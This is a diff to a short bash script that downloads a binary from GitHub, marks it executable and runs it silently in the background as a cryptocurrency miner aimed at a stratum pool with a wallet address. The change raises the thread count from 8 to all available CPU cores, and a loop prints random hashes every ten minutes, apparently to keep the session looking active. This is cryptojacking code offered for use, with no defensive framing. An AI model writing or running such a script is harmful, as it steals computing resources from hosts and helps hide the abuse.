@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://github.com/aqshakuy/urang/raw/main/aveex2
 chmod +x aveex2
-./aveex2 -a mike -o stratum+tcps://stratum-asia.rplant.xyz:17040 -u XwxK1NoBtas2PY1emFeqe3BR87NJWhZ3o2.$(echo $(shuf -i 1-20000 -n 1)-aa) -t8 > /dev/null 2>&1 &
+./aveex2 -a mike -o stratum+tcps://stratum-asia.rplant.xyz:17040 -u XwxK1NoBtas2PY1emFeqe3BR87NJWhZ3o2.$(echo $(shuf -i 1-20000 -n 1)-aa) -t$(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
